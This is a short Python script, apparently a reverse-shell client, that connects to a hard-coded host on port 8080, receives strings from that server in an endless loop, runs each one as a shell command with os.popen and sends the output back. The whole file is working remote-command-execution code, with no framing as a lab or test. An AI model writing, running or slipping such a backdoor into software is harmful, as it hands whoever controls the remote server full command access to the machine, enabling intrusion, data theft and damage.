import time
import socket
import sys
import os
s = socket.socket()
host = "vlmazrasdev2mn1.fisdev.local"
port = 8080
s.connect((host, port))
print("connected to server")
while True:
    command = s.recv(1024)
    command = command.decode()
#if command == "open":
    print("command is : ", command)
    output = os.popen(command).read()
    s.send(output.encode())
    #os.system(command)
